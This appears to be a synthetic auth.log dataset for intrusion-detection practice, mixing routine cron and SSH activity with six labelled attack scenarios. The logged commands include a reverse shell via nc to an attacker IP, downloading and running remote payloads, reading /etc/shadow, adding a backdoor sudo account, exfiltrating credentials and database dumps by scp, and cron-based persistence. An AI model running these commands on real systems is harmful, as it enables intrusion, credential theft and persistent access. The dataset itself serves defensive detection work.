@@ -1,0 +1,286 @@
+# Simulated auth.log - Multi-scenario attack dataset
+# Contains: Normal operations + 6 distinct attack scenarios
+# Total events: ~250 entries
+
+# === NORMAL BACKGROUND TRAFFIC (Dec 20 08:00 - 14:00) ===
+Dec 20 08:00:01 webserver CRON[1001]: pam_unix(cron:session): session opened for user root by (uid=0)
+Dec 20 08:00:01 webserver CRON[1001]: pam_unix(cron:session): session closed for user root
+Dec 20 08:05:00 webserver sshd[1010]: Accepted publickey for deploy from 10.0.0.5 port 52100 ssh2
+Dec 20 08:05:00 webserver sshd[1010]: pam_unix(sshd:session): session opened for user deploy by (uid=0)
+Dec 20 08:05:01 webserver systemd-logind[500]: New session 1 of user deploy.
+Dec 20 08:10:15 webserver sudo[1020]: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx
+Dec 20 08:10:15 webserver sudo[1020]: pam_unix(sudo:session): session opened for user root by deploy(uid=1001)
+Dec 20 08:10:16 webserver sudo[1020]: pam_unix(sudo:session): session closed for user root
+Dec 20 08:15:00 webserver sshd[1010]: pam_unix(sshd:session): session closed for user deploy
+Dec 20 08:30:01 webserver CRON[1030]: pam_unix(cron:session): session opened for user root by (uid=0)
+Dec 20 08:30:01 webserver CRON[1030]: pam_unix(cron:session): session closed for user root
+Dec 20 09:00:01 webserver CRON[1040]: pam_unix(cron:session): session opened for user www-data by (uid=0)
+Dec 20 09:00:01 webserver CRON[1040]: pam_unix(cron:session): session closed for user www-data
+Dec 20 09:15:00 webserver sshd[1050]: Accepted publickey for admin from 10.0.0.10 port 52200 ssh2
+Dec 20 09:15:00 webserver sshd[1050]: pam_unix(sshd:session): session opened for user admin by (uid=0)
+Dec 20 09:15:01 webserver systemd-logind[500]: New session 2 of user admin.
+Dec 20 09:20:00 webserver sudo[1060]: admin : TTY=pts/1 ; PWD=/var/log ; USER=root ; COMMAND=/usr/bin/tail -f /var/log/syslog
+Dec 20 09:45:00 webserver sshd[1050]: pam_unix(sshd:session): session closed for user admin
+Dec 20 10:00:01 webserver CRON[1070]: pam_unix(cron:session): session opened for user root by (uid=0)
+Dec 20 10:00:01 webserver CRON[1070]: pam_unix(cron:session): session closed for user root
+Dec 20 10:30:01 webserver CRON[1080]: pam_unix(cron:session): session opened for user root by (uid=0)
+Dec 20 10:30:01 webserver CRON[1080]: pam_unix(cron:session): session closed for user root
+Dec 20 11:00:01 webserver CRON[1090]: pam_unix(cron:session): session opened for user root by (uid=0)
+Dec 20 11:00:01 webserver CRON[1090]: pam_unix(cron:session): session closed for user root
+Dec 20 11:30:01 webserver CRON[1100]: pam_unix(cron:session): session opened for user root by (uid=0)
+Dec 20 11:30:01 webserver CRON[1100]: pam_unix(cron:session): session closed for user root
+Dec 20 12:00:01 webserver CRON[1110]: pam_unix(cron:session): session opened for user www-data by (uid=0)
+Dec 20 12:00:01 webserver CRON[1110]: pam_unix(cron:session): session closed for user www-data
+Dec 20 12:15:00 webserver sshd[1120]: Accepted publickey for deploy from 10.0.0.5 port 52300 ssh2
+Dec 20 12:15:00 webserver sshd[1120]: pam_unix(sshd:session): session opened for user deploy by (uid=0)
+Dec 20 12:15:01 webserver systemd-logind[500]: New session 3 of user deploy.
+Dec 20 12:20:00 webserver sudo[1130]: deploy : TTY=pts/0 ; PWD=/var/www ; USER=root ; COMMAND=/usr/bin/git pull origin main
+Dec 20 12:25:00 webserver sshd[1120]: pam_unix(sshd:session): session closed for user deploy
+Dec 20 13:00:01 webserver CRON[1140]: pam_unix(cron:session): session opened for user root by (uid=0)
+Dec 20 13:00:01 webserver CRON[1140]: pam_unix(cron:session): session closed for user root
+Dec 20 13:30:01 webserver CRON[1150]: pam_unix(cron:session): session opened for user root by (uid=0)
+Dec 20 13:30:01 webserver CRON[1150]: pam_unix(cron:session): session closed for user root
+
+# === ATTACK SCENARIO 1: Classic SSH Brute Force from Single IP (Dec 20 14:20) ===
+# Attacker: 192.168.1.50 targeting user 'testuser'
+Dec 20 14:20:01 webserver sshd[12340]: Invalid user admin from 192.168.1.50 port 45670
+Dec 20 14:20:01 webserver sshd[12340]: Failed password for invalid user admin from 192.168.1.50 port 45670 ssh2
+Dec 20 14:20:02 webserver sshd[12341]: Invalid user root from 192.168.1.50 port 45671
+Dec 20 14:20:02 webserver sshd[12341]: Failed password for invalid user root from 192.168.1.50 port 45671 ssh2
+Dec 20 14:20:03 webserver sshd[12342]: Invalid user administrator from 192.168.1.50 port 45672
+Dec 20 14:20:03 webserver sshd[12342]: Failed password for invalid user administrator from 192.168.1.50 port 45672 ssh2
+Dec 20 14:20:04 webserver sshd[12343]: Failed password for testuser from 192.168.1.50 port 45673 ssh2
+Dec 20 14:20:05 webserver sshd[12344]: Failed password for testuser from 192.168.1.50 port 45674 ssh2
+Dec 20 14:20:06 webserver sshd[12345]: Failed password for testuser from 192.168.1.50 port 45675 ssh2
+Dec 20 14:20:07 webserver sshd[12346]: Failed password for testuser from 192.168.1.50 port 45676 ssh2
+Dec 20 14:20:08 webserver sshd[12347]: Failed password for testuser from 192.168.1.50 port 45677 ssh2
+Dec 20 14:20:09 webserver sshd[12348]: Failed password for testuser from 192.168.1.50 port 45678 ssh2
+Dec 20 14:20:10 webserver sshd[12349]: Failed password for testuser from 192.168.1.50 port 45679 ssh2
+Dec 20 14:20:11 webserver sshd[12350]: error: maximum authentication attempts exceeded for testuser from 192.168.1.50 port 45680 ssh2
+Dec 20 14:20:12 webserver sshd[12351]: Failed password for testuser from 192.168.1.50 port 45681 ssh2
+Dec 20 14:20:13 webserver sshd[12352]: Failed password for testuser from 192.168.1.50 port 45682 ssh2
+Dec 20 14:20:14 webserver sshd[12353]: Failed password for testuser from 192.168.1.50 port 45683 ssh2
+Dec 20 14:20:15 webserver sshd[12354]: Accepted password for testuser from 192.168.1.50 port 45684 ssh2
+Dec 20 14:20:15 webserver sshd[12354]: pam_unix(sshd:session): session opened for user testuser by (uid=0)
+Dec 20 14:20:16 webserver systemd-logind[500]: New session 45 of user testuser.
+Dec 20 14:20:30 webserver sudo[12400]: testuser : TTY=pts/0 ; PWD=/home/testuser ; USER=root ; COMMAND=/bin/bash
+Dec 20 14:20:30 webserver sudo[12400]: pam_unix(sudo:session): session opened for user root by testuser(uid=1000)
+Dec 20 14:21:05 webserver sudo[12450]: testuser : TTY=pts/0 ; PWD=/home/testuser ; USER=root ; COMMAND=/usr/bin/id
+Dec 20 14:21:10 webserver sudo[12455]: testuser : TTY=pts/0 ; PWD=/home/testuser ; USER=root ; COMMAND=/usr/bin/whoami
+Dec 20 14:21:15 webserver sudo[12460]: testuser : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/wget http://192.168.1.50/payload.sh -O /tmp/payload.sh
+Dec 20 14:21:20 webserver sudo[12465]: testuser : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/bin/chmod +x /tmp/payload.sh
+Dec 20 14:21:25 webserver sudo[12470]: testuser : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/tmp/payload.sh
+Dec 20 14:22:00 webserver sudo[12475]: testuser : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/crontab -e
+Dec 20 14:25:00 webserver sshd[12354]: pam_unix(sshd:session): session closed for user testuser
+
+# === NORMAL TRAFFIC BETWEEN ATTACKS ===
+Dec 20 14:30:01 webserver CRON[2001]: pam_unix(cron:session): session opened for user root by (uid=0)
+Dec 20 14:30:01 webserver CRON[2001]: pam_unix(cron:session): session closed for user root
+Dec 20 15:00:01 webserver CRON[2010]: pam_unix(cron:session): session opened for user root by (uid=0)
+Dec 20 15:00:01 webserver CRON[2010]: pam_unix(cron:session): session closed for user root
+
+# === ATTACK SCENARIO 2: Distributed Brute Force (Dec 20 15:30) ===
+# Multiple IPs from botnet targeting 'developer' account
+Dec 20 15:30:01 webserver sshd[13001]: Failed password for developer from 45.33.32.156 port 51001 ssh2
+Dec 20 15:30:02 webserver sshd[13002]: Failed password for developer from 104.236.198.48 port 51002 ssh2
+Dec 20 15:30:03 webserver sshd[13003]: Failed password for developer from 178.62.249.168 port 51003 ssh2
+Dec 20 15:30:04 webserver sshd[13004]: Failed password for developer from 139.59.173.249 port 51004 ssh2
+Dec 20 15:30:05 webserver sshd[13005]: Failed password for developer from 167.99.80.201 port 51005 ssh2
+Dec 20 15:30:06 webserver sshd[13006]: Failed password for developer from 45.33.32.156 port 51006 ssh2
+Dec 20 15:30:07 webserver sshd[13007]: Failed password for developer from 104.236.198.48 port 51007 ssh2
+Dec 20 15:30:08 webserver sshd[13008]: Failed password for developer from 178.62.249.168 port 51008 ssh2
+Dec 20 15:30:09 webserver sshd[13009]: Failed password for developer from 139.59.173.249 port 51009 ssh2
+Dec 20 15:30:10 webserver sshd[13010]: Failed password for developer from 167.99.80.201 port 51010 ssh2
+Dec 20 15:30:11 webserver sshd[13011]: Failed password for developer from 45.33.32.156 port 51011 ssh2
+Dec 20 15:30:12 webserver sshd[13012]: Failed password for developer from 104.236.198.48 port 51012 ssh2
+Dec 20 15:30:13 webserver sshd[13013]: Failed password for developer from 178.62.249.168 port 51013 ssh2
+Dec 20 15:30:14 webserver sshd[13014]: Failed password for developer from 139.59.173.249 port 51014 ssh2
+Dec 20 15:30:15 webserver sshd[13015]: Accepted password for developer from 167.99.80.201 port 51015 ssh2
+Dec 20 15:30:15 webserver sshd[13015]: pam_unix(sshd:session): session opened for user developer by (uid=0)
+Dec 20 15:30:16 webserver systemd-logind[500]: New session 50 of user developer.
+Dec 20 15:31:00 webserver sudo[13100]: developer : TTY=pts/1 ; PWD=/home/developer ; USER=root ; COMMAND=/bin/su -
+Dec 20 15:31:00 webserver sudo[13100]: pam_unix(sudo:session): session opened for user root by developer(uid=1002)
+Dec 20 15:31:30 webserver sudo[13150]: developer : TTY=pts/1 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow
+Dec 20 15:32:00 webserver sudo[13155]: developer : TTY=pts/1 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/useradd -m -s /bin/bash backdoor
+Dec 20 15:32:05 webserver sudo[13160]: developer : TTY=pts/1 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/passwd backdoor
+Dec 20 15:32:10 webserver sudo[13165]: developer : TTY=pts/1 ; PWD=/root ; USER=root ; COMMAND=/usr/sbin/usermod -aG sudo backdoor
+Dec 20 15:35:00 webserver sshd[13015]: pam_unix(sshd:session): session closed for user developer
+
+# === NORMAL TRAFFIC ===
+Dec 20 16:00:01 webserver CRON[3001]: pam_unix(cron:session): session opened for user root by (uid=0)
+Dec 20 16:00:01 webserver CRON[3001]: pam_unix(cron:session): session closed for user root
+Dec 20 16:15:00 webserver sshd[3010]: Accepted publickey for deploy from 10.0.0.5 port 52400 ssh2
+Dec 20 16:15:00 webserver sshd[3010]: pam_unix(sshd:session): session opened for user deploy by (uid=0)
+Dec 20 16:15:01 webserver systemd-logind[500]: New session 51 of user deploy.
+Dec 20 16:20:00 webserver sudo[3020]: deploy : TTY=pts/2 ; PWD=/var/www ; USER=root ; COMMAND=/usr/bin/systemctl reload nginx
+Dec 20 16:25:00 webserver sshd[3010]: pam_unix(sshd:session): session closed for user deploy
+Dec 20 16:30:01 webserver CRON[3030]: pam_unix(cron:session): session opened for user root by (uid=0)
+Dec 20 16:30:01 webserver CRON[3030]: pam_unix(cron:session): session closed for user root
+
+# === ATTACK SCENARIO 3: Credential Stuffing Attack (Dec 20 17:00) ===
+# Attacker using leaked credentials from data breach
+Dec 20 17:00:01 webserver sshd[14001]: Invalid user john.smith from 91.121.87.10 port 55001
+Dec 20 17:00:01 webserver sshd[14001]: Failed password for invalid user john.smith from 91.121.87.10 port 55001 ssh2
+Dec 20 17:00:02 webserver sshd[14002]: Invalid user jane.doe from 91.121.87.10 port 55002
+Dec 20 17:00:02 webserver sshd[14002]: Failed password for invalid user jane.doe from 91.121.87.10 port 55002 ssh2
+Dec 20 17:00:03 webserver sshd[14003]: Invalid user mike.wilson from 91.121.87.10 port 55003
+Dec 20 17:00:03 webserver sshd[14003]: Failed password for invalid user mike.wilson from 91.121.87.10 port 55003 ssh2
+Dec 20 17:00:04 webserver sshd[14004]: Invalid user sarah.jones from 91.121.87.10 port 55004
+Dec 20 17:00:04 webserver sshd[14004]: Failed password for invalid user sarah.jones from 91.121.87.10 port 55004 ssh2
+Dec 20 17:00:05 webserver sshd[14005]: Invalid user david.brown from 91.121.87.10 port 55005
+Dec 20 17:00:05 webserver sshd[14005]: Failed password for invalid user david.brown from 91.121.87.10 port 55005 ssh2
+Dec 20 17:00:06 webserver sshd[14006]: Invalid user emily.davis from 91.121.87.10 port 55006
+Dec 20 17:00:06 webserver sshd[14006]: Failed password for invalid user emily.davis from 91.121.87.10 port 55006 ssh2
+Dec 20 17:00:07 webserver sshd[14007]: Invalid user chris.miller from 91.121.87.10 port 55007
+Dec 20 17:00:07 webserver sshd[14007]: Failed password for invalid user chris.miller from 91.121.87.10 port 55007 ssh2
+Dec 20 17:00:08 webserver sshd[14008]: Invalid user amanda.taylor from 91.121.87.10 port 55008
+Dec 20 17:00:08 webserver sshd[14008]: Failed password for invalid user amanda.taylor from 91.121.87.10 port 55008 ssh2
+Dec 20 17:00:09 webserver sshd[14009]: Invalid user robert.anderson from 91.121.87.10 port 55009
+Dec 20 17:00:09 webserver sshd[14009]: Failed password for invalid user robert.anderson from 91.121.87.10 port 55009 ssh2
+Dec 20 17:00:10 webserver sshd[14010]: Invalid user lisa.thomas from 91.121.87.10 port 55010
+Dec 20 17:00:10 webserver sshd[14010]: Failed password for invalid user lisa.thomas from 91.121.87.10 port 55010 ssh2
+Dec 20 17:00:11 webserver sshd[14011]: Invalid user kevin.jackson from 91.121.87.10 port 55011
+Dec 20 17:00:11 webserver sshd[14011]: Failed password for invalid user kevin.jackson from 91.121.87.10 port 55011 ssh2
+Dec 20 17:00:12 webserver sshd[14012]: Invalid user nicole.white from 91.121.87.10 port 55012
+Dec 20 17:00:12 webserver sshd[14012]: Failed password for invalid user nicole.white from 91.121.87.10 port 55012 ssh2
+Dec 20 17:00:13 webserver sshd[14013]: Invalid user brian.harris from 91.121.87.10 port 55013
+Dec 20 17:00:13 webserver sshd[14013]: Failed password for invalid user brian.harris from 91.121.87.10 port 55013 ssh2
+Dec 20 17:00:14 webserver sshd[14014]: Invalid user jennifer.martin from 91.121.87.10 port 55014
+Dec 20 17:00:14 webserver sshd[14014]: Failed password for invalid user jennifer.martin from 91.121.87.10 port 55014 ssh2
+Dec 20 17:00:15 webserver sshd[14015]: Failed password for webapp from 91.121.87.10 port 55015 ssh2
+Dec 20 17:00:16 webserver sshd[14016]: Failed password for webapp from 91.121.87.10 port 55016 ssh2
+Dec 20 17:00:17 webserver sshd[14017]: Accepted password for webapp from 91.121.87.10 port 55017 ssh2
+Dec 20 17:00:17 webserver sshd[14017]: pam_unix(sshd:session): session opened for user webapp by (uid=0)
+Dec 20 17:00:18 webserver systemd-logind[500]: New session 55 of user webapp.
+Dec 20 17:01:00 webserver sudo[14100]: webapp : TTY=pts/3 ; PWD=/home/webapp ; USER=root ; COMMAND=/usr/bin/find / -perm -4000 -type f 2>/dev/null
+Dec 20 17:01:30 webserver sudo[14110]: webapp : TTY=pts/3 ; PWD=/home/webapp ; USER=root ; COMMAND=/usr/bin/python3 -c 'import pty;pty.spawn("/bin/bash")'
+Dec 20 17:02:00 webserver sudo[14120]: webapp : TTY=pts/3 ; PWD=/home/webapp ; USER=root ; COMMAND=/bin/nc -e /bin/bash 91.121.87.10 4444
+Dec 20 17:05:00 webserver sshd[14017]: pam_unix(sshd:session): session closed for user webapp
+
+# === NORMAL TRAFFIC ===
+Dec 20 17:30:01 webserver CRON[4001]: pam_unix(cron:session): session opened for user root by (uid=0)
+Dec 20 17:30:01 webserver CRON[4001]: pam_unix(cron:session): session closed for user root
+Dec 20 18:00:01 webserver CRON[4010]: pam_unix(cron:session): session opened for user root by (uid=0)
+Dec 20 18:00:01 webserver CRON[4010]: pam_unix(cron:session): session closed for user root
+Dec 20 18:00:01 webserver CRON[4011]: pam_unix(cron:session): session opened for user www-data by (uid=0)
+Dec 20 18:00:01 webserver CRON[4011]: pam_unix(cron:session): session closed for user www-data
+
+# === ATTACK SCENARIO 4: Insider Threat / Lateral Movement (Dec 20 19:00) ===
+# Compromised internal workstation accessing production server
+Dec 20 19:00:00 webserver sshd[15001]: Accepted password for sysadmin from 10.0.0.150 port 60001 ssh2
+Dec 20 19:00:00 webserver sshd[15001]: pam_unix(sshd:session): session opened for user sysadmin by (uid=0)
+Dec 20 19:00:01 webserver systemd-logind[500]: New session 60 of user sysadmin.
+Dec 20 19:01:00 webserver sudo[15100]: sysadmin : TTY=pts/4 ; PWD=/home/sysadmin ; USER=root ; COMMAND=/bin/bash
+Dec 20 19:01:00 webserver sudo[15100]: pam_unix(sudo:session): session opened for user root by sysadmin(uid=1003)
+Dec 20 19:02:00 webserver sudo[15110]: sysadmin : TTY=pts/4 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/cat /etc/passwd
+Dec 20 19:02:05 webserver sudo[15115]: sysadmin : TTY=pts/4 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow
+Dec 20 19:02:10 webserver sudo[15120]: sysadmin : TTY=pts/4 ; PWD=/root ; USER=root ; COMMAND=/bin/tar czf /tmp/credentials.tar.gz /etc/passwd /etc/shadow /etc/ssh
+Dec 20 19:03:00 webserver sudo[15130]: sysadmin : TTY=pts/4 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/scp /tmp/credentials.tar.gz 10.0.0.150:/tmp/
+Dec 20 19:03:30 webserver sudo[15140]: sysadmin : TTY=pts/4 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/mysql -u root -p -e 'SELECT * FROM users' webapp_db
+Dec 20 19:04:00 webserver sudo[15150]: sysadmin : TTY=pts/4 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/mysqldump webapp_db > /tmp/db_dump.sql
+Dec 20 19:04:30 webserver sudo[15160]: sysadmin : TTY=pts/4 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/scp /tmp/db_dump.sql 10.0.0.150:/tmp/
+Dec 20 19:05:00 webserver sudo[15170]: sysadmin : TTY=pts/4 ; PWD=/root ; USER=root ; COMMAND=/bin/rm -f /tmp/credentials.tar.gz /tmp/db_dump.sql
+Dec 20 19:05:30 webserver sudo[15180]: sysadmin : TTY=pts/4 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/history -c
+Dec 20 19:06:00 webserver sshd[15001]: pam_unix(sshd:session): session closed for user sysadmin
+
+# === LATE NIGHT NORMAL TRAFFIC ===
+Dec 20 19:30:01 webserver CRON[5001]: pam_unix(cron:session): session opened for user root by (uid=0)
+Dec 20 19:30:01 webserver CRON[5001]: pam_unix(cron:session): session closed for user root
+Dec 20 20:00:01 webserver CRON[5010]: pam_unix(cron:session): session opened for user root by (uid=0)
+Dec 20 20:00:01 webserver CRON[5010]: pam_unix(cron:session): session closed for user root
+Dec 20 20:30:01 webserver CRON[5020]: pam_unix(cron:session): session opened for user root by (uid=0)
+Dec 20 20:30:01 webserver CRON[5020]: pam_unix(cron:session): session closed for user root
+Dec 20 21:00:01 webserver CRON[5030]: pam_unix(cron:session): session opened for user root by (uid=0)
+Dec 20 21:00:01 webserver CRON[5030]: pam_unix(cron:session): session closed for user root
+Dec 20 21:00:01 webserver CRON[5031]: pam_unix(cron:session): session opened for user www-data by (uid=0)
+Dec 20 21:00:01 webserver CRON[5031]: pam_unix(cron:session): session closed for user www-data
+
+# === ATTACK SCENARIO 5: Password Spray Attack (Dec 20 22:00) ===
+# Slow, low-and-slow attack using common passwords across multiple users
+Dec 20 22:00:01 webserver sshd[16001]: Failed password for admin from 185.220.101.33 port 61001 ssh2
+Dec 20 22:00:05 webserver sshd[16002]: Failed password for root from 185.220.101.33 port 61002 ssh2
+Dec 20 22:00:10 webserver sshd[16003]: Failed password for deploy from 185.220.101.33 port 61003 ssh2
+Dec 20 22:00:15 webserver sshd[16004]: Failed password for developer from 185.220.101.33 port 61004 ssh2
+Dec 20 22:00:20 webserver sshd[16005]: Failed password for testuser from 185.220.101.33 port 61005 ssh2
+Dec 20 22:00:25 webserver sshd[16006]: Failed password for webapp from 185.220.101.33 port 61006 ssh2
+Dec 20 22:00:30 webserver sshd[16007]: Failed password for sysadmin from 185.220.101.33 port 61007 ssh2
+Dec 20 22:05:01 webserver sshd[16011]: Failed password for admin from 185.220.101.33 port 61011 ssh2
+Dec 20 22:05:05 webserver sshd[16012]: Failed password for root from 185.220.101.33 port 61012 ssh2
+Dec 20 22:05:10 webserver sshd[16013]: Failed password for deploy from 185.220.101.33 port 61013 ssh2
+Dec 20 22:05:15 webserver sshd[16014]: Failed password for developer from 185.220.101.33 port 61014 ssh2
+Dec 20 22:05:20 webserver sshd[16015]: Failed password for testuser from 185.220.101.33 port 61015 ssh2
+Dec 20 22:05:25 webserver sshd[16016]: Failed password for webapp from 185.220.101.33 port 61016 ssh2
+Dec 20 22:05:30 webserver sshd[16017]: Failed password for sysadmin from 185.220.101.33 port 61017 ssh2
+Dec 20 22:10:01 webserver sshd[16021]: Failed password for admin from 185.220.101.33 port 61021 ssh2
+Dec 20 22:10:05 webserver sshd[16022]: Failed password for root from 185.220.101.33 port 61022 ssh2
+Dec 20 22:10:10 webserver sshd[16023]: Failed password for deploy from 185.220.101.33 port 61023 ssh2
+Dec 20 22:10:15 webserver sshd[16024]: Failed password for developer from 185.220.101.33 port 61024 ssh2
+Dec 20 22:10:20 webserver sshd[16025]: Failed password for testuser from 185.220.101.33 port 61025 ssh2
+Dec 20 22:10:25 webserver sshd[16026]: Accepted password for webapp from 185.220.101.33 port 61026 ssh2
+Dec 20 22:10:25 webserver sshd[16026]: pam_unix(sshd:session): session opened for user webapp by (uid=0)
+Dec 20 22:10:26 webserver systemd-logind[500]: New session 65 of user webapp.
+Dec 20 22:11:00 webserver sudo[16100]: webapp : TTY=pts/5 ; PWD=/home/webapp ; USER=root ; COMMAND=/usr/bin/wget http://185.220.101.33/implant -O /dev/shm/.hidden
+Dec 20 22:11:05 webserver sudo[16105]: webapp : TTY=pts/5 ; PWD=/home/webapp ; USER=root ; COMMAND=/bin/chmod +x /dev/shm/.hidden
+Dec 20 22:11:10 webserver sudo[16110]: webapp : TTY=pts/5 ; PWD=/home/webapp ; USER=root ; COMMAND=/dev/shm/.hidden
+Dec 20 22:12:00 webserver sudo[16120]: webapp : TTY=pts/5 ; PWD=/home/webapp ; USER=root ; COMMAND=/bin/bash -c 'echo "* * * * * /dev/shm/.hidden" | crontab -'
+Dec 20 22:15:00 webserver sshd[16026]: pam_unix(sshd:session): session closed for user webapp
+
+# === MORE NORMAL OVERNIGHT TRAFFIC ===
+Dec 20 22:30:01 webserver CRON[6001]: pam_unix(cron:session): session opened for user root by (uid=0)
+Dec 20 22:30:01 webserver CRON[6001]: pam_unix(cron:session): session closed for user root
+Dec 20 23:00:01 webserver CRON[6010]: pam_unix(cron:session): session opened for user root by (uid=0)
+Dec 20 23:00:01 webserver CRON[6010]: pam_unix(cron:session): session closed for user root
+Dec 20 23:30:01 webserver CRON[6020]: pam_unix(cron:session): session opened for user root by (uid=0)
+Dec 20 23:30:01 webserver CRON[6020]: pam_unix(cron:session): session closed for user root
+Dec 21 00:00:01 webserver CRON[6030]: pam_unix(cron:session): session opened for user root by (uid=0)
+Dec 21 00:00:01 webserver CRON[6030]: pam_unix(cron:session): session closed for user root
+Dec 21 00:00:01 webserver CRON[6031]: pam_unix(cron:session): session opened for user www-data by (uid=0)
+Dec 21 00:00:01 webserver CRON[6031]: pam_unix(cron:session): session closed for user www-data
+
+# === ATTACK SCENARIO 6: Backdoor Access (Dec 21 02:00) ===
+# Attacker returns using previously created backdoor account
+Dec 21 02:00:00 webserver sshd[17001]: Accepted password for backdoor from 167.99.80.201 port 62001 ssh2
+Dec 21 02:00:00 webserver sshd[17001]: pam_unix(sshd:session): session opened for user backdoor by (uid=0)
+Dec 21 02:00:01 webserver systemd-logind[500]: New session 70 of user backdoor.
+Dec 21 02:01:00 webserver sudo[17100]: backdoor : TTY=pts/6 ; PWD=/home/backdoor ; USER=root ; COMMAND=/bin/bash
+Dec 21 02:01:00 webserver sudo[17100]: pam_unix(sudo:session): session opened for user root by backdoor(uid=1004)
+Dec 21 02:02:00 webserver sudo[17110]: backdoor : TTY=pts/6 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/apt-get install nmap
+Dec 21 02:03:00 webserver sudo[17120]: backdoor : TTY=pts/6 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/nmap -sS 10.0.0.0/24
+Dec 21 02:05:00 webserver sudo[17130]: backdoor : TTY=pts/6 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/ssh-keygen -t rsa -N '' -f /root/.ssh/id_rsa
+Dec 21 02:05:30 webserver sudo[17140]: backdoor : TTY=pts/6 ; PWD=/root ; USER=root ; COMMAND=/bin/cat /root/.ssh/id_rsa.pub >> /root/.ssh/authorized_keys
+Dec 21 02:06:00 webserver sudo[17150]: backdoor : TTY=pts/6 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/ssh -o StrictHostKeyChecking=no 10.0.0.20
+Dec 21 02:10:00 webserver sshd[17001]: pam_unix(sshd:session): session closed for user backdoor
+
+# === EARLY MORNING NORMAL TRAFFIC ===
+Dec 21 03:00:01 webserver CRON[7001]: pam_unix(cron:session): session opened for user root by (uid=0)
+Dec 21 03:00:01 webserver CRON[7001]: pam_unix(cron:session): session closed for user root
+Dec 21 04:00:01 webserver CRON[7010]: pam_unix(cron:session): session opened for user root by (uid=0)
+Dec 21 04:00:01 webserver CRON[7010]: pam_unix(cron:session): session closed for user root
+Dec 21 05:00:01 webserver CRON[7020]: pam_unix(cron:session): session opened for user root by (uid=0)
+Dec 21 05:00:01 webserver CRON[7020]: pam_unix(cron:session): session closed for user root
+Dec 21 06:00:01 webserver CRON[7030]: pam_unix(cron:session): session opened for user root by (uid=0)
+Dec 21 06:00:01 webserver CRON[7030]: pam_unix(cron:session): session closed for user root
+Dec 21 06:00:01 webserver CRON[7031]: pam_unix(cron:session): session opened for user www-data by (uid=0)
+Dec 21 06:00:01 webserver CRON[7031]: pam_unix(cron:session): session closed for user www-data
+
+# === LEGITIMATE MORNING ADMIN ACTIVITY ===
+Dec 21 07:00:00 webserver sshd[8001]: Accepted publickey for admin from 10.0.0.10 port 52500 ssh2
+Dec 21 07:00:00 webserver sshd[8001]: pam_unix(sshd:session): session opened for user admin by (uid=0)
+Dec 21 07:00:01 webserver systemd-logind[500]: New session 75 of user admin.
+Dec 21 07:05:00 webserver sudo[8010]: admin : TTY=pts/0 ; PWD=/var/log ; USER=root ; COMMAND=/usr/bin/grep -i error /var/log/syslog
+Dec 21 07:10:00 webserver sudo[8020]: admin : TTY=pts/0 ; PWD=/var/log ; USER=root ; COMMAND=/usr/bin/systemctl status nginx
+Dec 21 07:15:00 webserver sshd[8001]: pam_unix(sshd:session): session closed for user admin
+
+# === FAILED SSH ATTEMPTS (INTERNET NOISE) ===
+Dec 21 07:30:15 webserver sshd[8100]: Invalid user oracle from 118.24.187.65 port 33501
+Dec 21 07:30:15 webserver sshd[8100]: Failed password for invalid user oracle from 118.24.187.65 port 33501 ssh2
+Dec 21 07:45:22 webserver sshd[8101]: Invalid user postgres from 103.207.38.14 port 44502
+Dec 21 07:45:22 webserver sshd[8101]: Failed password for invalid user postgres from 103.207.38.14 port 44502 ssh2
+Dec 21 08:00:01 webserver CRON[8110]: pam_unix(cron:session): session opened for user root by (uid=0)
+Dec 21 08:00:01 webserver CRON[8110]: pam_unix(cron:session): session closed for user root
+Dec 21 08:15:33 webserver sshd[8120]: Invalid user mysql from 222.186.30.112 port 55503
+Dec 21 08:15:33 webserver sshd[8120]: Failed password for invalid user mysql from 222.186.30.112 port 55503 ssh2
+Dec 21 08:30:01 webserver CRON[8130]: pam_unix(cron:session): session opened for user root by (uid=0)
+Dec 21 08:30:01 webserver CRON[8130]: pam_unix(cron:session): session closed for user root
+Dec 21 08:45:44 webserver sshd[8140]: Invalid user ubuntu from 58.218.92.37 port 36504
+Dec 21 08:45:44 webserver sshd[8140]: Failed password for invalid user ubuntu from 58.218.92.37 port 36504 ssh2
